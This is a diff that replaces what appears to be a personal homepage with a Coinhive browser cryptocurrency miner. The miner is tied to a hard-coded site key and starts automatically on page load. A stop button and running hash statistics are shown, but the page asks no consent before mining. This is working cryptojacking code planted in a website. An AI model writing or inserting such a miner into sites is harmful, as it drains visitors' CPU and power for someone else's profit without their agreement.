@@ -1,59 +1,36 @@
-<!DOCTYPE html>
-<head>
-  <title>Dev Patel</title> 
-  <style>
-  body {
-      text-align: center;
-      color: white;
-      font-family: helvetica;
-    }
-    header {
-      text-align: left;
-      background: url("http://www.hdcarwallpapers.com/walls/blue_lamborghini_huracan-wide.jpg");
-      background-size: cover;
-      color: white;
-    }
-    a {
-      color: white;
-    }
-    h1 {
-      font-size: 70px;
-    }
-    img {
-      margin: 40px 0px 0px 0px;
-      border: 7px solid white;
-      border-radius: 20px;
-    }
-    ul {
-      padding: 10px;
-      background: rgba(0,0,0,0.5);
-    }
-    li {
-      display: inline;
-      padding: 0px 10px 0px 10px;
-    }
-    @media (max-width: 500px) {
-      h1 {
-        font-size: 36px;
-        padding: 5px;
-      }
-      li {
-        padding: 5px;
-        display: block;
-      }
-    }
-  </style>
-</head>
+<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+<center>
+<p id="tcount"></p>
+<p id="hps"></p>
+<p id="ths"></p>
+<p id="tah"></p>
+</center>
+<center>
+<p id="minebutton"></p>
+</center>
+<p>Visit <a href="https://coin-hive.com/">Coin Hive</a> to learn more about how this works</a>
 
-<body>
-  <header>
-    <img src="http://dash.ga.co/assets/jeff.png">
-    <h1>Dev Patel</h1>
-    <ul>
-      <li><a href="#">About Me</a></li>
-      <li><a href="#">Apps</a></li>
-      <li><a href="#">Projects</a></li>
-    </ul>
-  </header>
-</body>
-
+<script type="text/javascript">
+var miner = new CoinHive.Anonymous('mhAKWNsDbFv8RO3qP8pEQCGHEiC2x5qK','threads: 1');
+miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+// Update stats once per second
+setInterval(function() {
+    var threadCount = miner.getNumThreads();
+    var hashesPerSecond = Math.round(miner.getHashesPerSecond() * 100) / 100;
+    var totalHashes = miner.getTotalHashes();
+    var acceptedHashes = miner.getAcceptedHashes() / 256;
+    // Output to HTML elements...
+    if (miner.isRunning()) {
+        document.getElementById("tcount").innerHTML = "Threads: " + threadCount;
+        document.getElementById("hps").innerHTML = "hashes per second: " + hashesPerSecond;
+        document.getElementById("ths").innerHTML = "Total Hashes: " + totalHashes;
+        document.getElementById("tah").innerHTML = "Accepted Hashes: " + acceptedHashes;
+        document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.stop()\">Stop Mining</button>";
+    } else {
+        document.getElementById("hps").innerHTML = "Please click start";
+        document.getElementById("ths").innerHTML = "to support";
+        document.getElementById("tah").innerHTML = "this site";
+        document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.start(CoinHive.FORCE_EXCLUSIVE_TAB)\">Start Mining</button>";
+    }
+}, 1000);
+</script>
